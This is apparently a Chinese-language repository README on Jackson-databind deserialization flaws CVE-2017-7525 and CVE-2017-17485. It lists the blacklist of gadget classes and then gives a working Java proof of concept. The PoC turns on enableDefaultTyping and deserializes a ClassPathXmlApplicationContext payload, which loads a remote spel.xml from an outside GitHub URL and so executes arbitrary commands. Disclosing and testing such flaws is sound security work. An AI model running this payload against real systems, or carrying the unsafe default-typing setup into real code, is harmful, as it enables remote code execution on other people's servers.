# Jackson 反序列化

## 漏洞描述

### CVE-2017-7525
官方在漏洞产生后，通过黑名单的方式禁止黑名单中的第三方库反序列化问题而产生的代码执行漏洞,黑名单是一种不可靠的修复方式，攻击者常常可以通过一些手段绕过黑名单，造成漏洞影响。

黑名单如下：
```
org.apache.commons.collections.functors.InvokerTransformer
org.apache.commons.collections.functors.InstantiateTransformer
org.apache.commons.collections4.functors.InvokerTransformer
org.apache.commons.collections4.functors.InstantiateTransformer
org.codehaus.groovy.runtime.ConvertedClosure
org.codehaus.groovy.runtime.MethodClosure
org.springframework.beans.factory.ObjectFactory
com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl

```
### 新漏洞的产生CVE-2017-17485
在开启enableDefaultTyping()的前提下可以通过Jackson-databind来滥用Spring spel来执行任意命令。

## 验证代码

本项目中的war包基于廖师傅 https://github.com/shengqi158/Jackson-databind-RCE-PoC 的改造

基友的 https://github.com/hucheat/vulns/tree/master/cve-2017-17485_web_vuln

```
package jackson;

import java.io.IOException;

import com.fasterxml.jackson.databind.ObjectMapper;

/**
 * Jackson CVE-2017-17485
 * 2018-01-22
 * @author Bearcat
 *
 */
public class poc {
	public static void payload() {
		/*
		 * 假设是攻击者的恶意JSON请求数据
		 * ["org.springframework.context.support.ClassPathXmlApplicationContext", "http://127.0.0.1/spel.xml"]
		 * 
		 */
		String payload = "[\"org.springframework.context.support.ClassPathXmlApplicationContext\", " +
	                "\"https://raw.githubusercontent.com/iBearcat/Jackson-CVE-2017-17485/master/spel.xml\"]\n";
		System.out.println(payload);
		ObjectMapper mapper = new ObjectMapper();
		mapper.enableDefaultTyping();
		try {
			mapper.readValue(payload, Object.class);
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	public static void main(String args[]) {
		payload();
	}
}
```

![payload](https://raw.githubusercontent.com/iBearcat/Jackson-CVE-2017-17485/master/img/1.jpg)
